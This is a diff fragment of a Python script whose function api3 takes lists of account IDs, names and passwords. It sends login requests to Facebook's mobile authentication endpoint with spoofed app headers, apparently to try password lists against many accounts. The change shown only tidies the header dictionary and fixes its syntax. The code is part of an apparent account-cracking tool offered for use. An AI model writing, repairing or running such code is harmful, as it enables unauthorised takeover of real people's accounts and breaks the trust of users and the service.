@@ -540,12 +540,12 @@ def api3(ids,names,passlist):
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                                        'x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','x-FB-Request-Analytics-Tags': 'graphservice',
-                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-                                        'Connection': 'Keep-Alive'},
-                                        
+                                        'x-fb-device-group': '5120',
+                                        'x-fb-Friendly-Name': 'ViewerReactionsMutation',
+                                        'x-fb-Request-Analytics-Tags': 'graphservice',
+                                        'x-fb-connection-token': 'd29d67d37eca387482a8',
                                         'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':'Liger'}
+                                        'x-fb-http-engine':'Liger'},
                                 url = 'https://b-graph.facebook.com/auth/login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
